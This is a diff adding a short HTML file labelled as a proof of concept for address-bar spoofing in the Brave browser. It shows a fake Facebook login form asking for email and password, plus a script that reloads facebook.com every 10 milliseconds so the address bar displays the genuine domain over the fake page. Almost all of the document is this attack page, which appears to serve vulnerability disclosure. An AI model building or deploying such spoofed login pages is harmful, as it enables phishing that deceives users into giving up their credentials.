@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Brave Address Bar Spoofing PoC</title>
+</head>
+<body>
+    <h1>This is a Fake Facebook Login Page</h1>
+    <form>
+        Email: <input type="text" name="username" placeholder="Enter email"><br>
+        Password: <input type="password" name="password" placeholder="Enter password">
+    </form>
+
+    <script>
+        function spoofAddressBar() {
+            location = "https://facebook.com";  // Spoofs the address bar
+        }
+        setInterval(spoofAddressBar, 10);
+    </script>
+</body>
+</html>
